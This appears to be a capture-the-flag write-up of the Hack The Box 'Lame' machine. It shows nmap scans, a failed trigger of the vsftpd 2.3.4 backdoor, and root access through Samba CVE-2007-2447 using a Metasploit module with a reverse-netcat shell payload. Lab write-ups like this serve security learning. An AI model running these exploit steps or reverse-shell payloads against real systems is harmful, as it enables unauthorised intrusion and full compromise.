Lame is an easy Linux box and one of the oldest on HTB. The intended path is a Samba exploit: version 3.0.20 is vulnerable to CVE-2007-2447, a command injection through the username field that gives a shell straight as root — no privesc needed. There's also a vsftpd 2.3.4 backdoor on FTP, but it's patched on this machine and leads nowhere.

## Recon

### nmap

I start with a full TCP scan:

```
chickenprophecy@pwn$ nmap -p- --min-rate 10000 -sC -sV 10.129.63.135 -Pn

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
```

![nmap output]({{ '/assets/img/lame/02-nmap-1.png' | relative_url }})
![nmap output]({{ '/assets/img/lame/03-nmap-2.png' | relative_url }})

Five open ports. The two that stand out immediately: FTP is running vsftpd 2.3.4, which has a famous backdoor, and Samba is on 3.0.20-Debian, which is very old.

### UDP

chickenprophecy@pwn$ sudo nmap -sU -F 10.129.63.135

PORT    STATE  SERVICE

Nothing useful on UDP.

## FTP — dead end

Anonymous login is allowed, but the FTP root is completely empty. vsftpd 2.3.4 has a backdoor where sending a username containing `:)` triggers a shell on port 6200. I try it:

```
chickenprophecy@pwn$ ftp 10.129.63.135
Name: stef :)
Password: anything
530 Login incorrect.
ftp: Login failed.

chickenprophecy@pwn$ nc 10.129.63.135 6200
```

![ftp backdoor attempt]({{ '/assets/img/lame/04-ftp-backdoor.png' | relative_url }})

No response. Port 6200 never opens — the backdoor is patched on this machine. Moving on.

## Samba → root

### Confirming the version

```
chickenprophecy@pwn$ nmap --script smb-os-discovery.nse -p139,445 10.129.63.135 -Pn

| smb-os-discovery:
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   Domain name: hackthebox.gr
```

![smb discovery]({{ '/assets/img/lame/05-smb-discovery.png' | relative_url }})

Samba 3.0.20 is vulnerable to CVE-2007-2447, a command injection in the MS-RPC `SamrChangePassword` function. When the username field is processed, shell metacharacters aren't sanitised, so Samba executes whatever gets passed in — as root.

### Exploiting with Metasploit

There's a ready module for this:

```
chickenprophecy@pwn$ msfconsole
msf6 > use exploit/multi/samba/usermap_script
msf6 exploit > set RHOSTS 10.129.63.135
msf6 exploit > set PAYLOAD cmd/unix/reverse_netcat
msf6 exploit > set LHOST 10.10.15.179
msf6 exploit > exploit
```

The exploit fires and drops me straight into a shell:

```
root@lame:/# id
uid=0(root) gid=0(root)
```

Root immediately, no escalation needed.
